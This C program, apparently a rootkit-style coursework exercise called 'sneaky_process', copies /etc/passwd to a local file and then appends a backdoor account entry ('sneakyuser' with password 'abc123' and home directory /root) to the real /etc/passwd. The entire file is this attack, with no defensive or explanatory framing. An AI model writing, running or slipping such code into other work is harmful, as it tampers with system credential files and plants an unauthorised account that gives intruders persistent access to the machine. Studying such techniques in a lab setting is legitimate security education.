#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include<fcntl.h>
#include<sys/stat.h>
#include<sys/types.h>
#include <string.h>

//const char *originfile="etc/password";
//const char *tmpfile="tmp/password";
  

int main(){
  //#1 print id
  printf("sneaky_process pid:%d\n",getpid());
  //#2.1 copy file to destination
  FILE *f_o =fopen("/etc/passwd","r");
  char c;
  FILE *f_w=fopen("test/tmp","w");
  while((c=fgetc(f_o))!=EOF){
    fprintf(f_w,"%c",c);
  }
  fclose(f_o);
  fclose(f_w);
  //#2.2 add line to the original
  FILE *add_line=fopen("/etc/passwd","a");
  const char* s="sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(add_line,"%s",s);
  fclose(add_line);
  //


  
  return EXIT_SUCCESS;


  
 
}
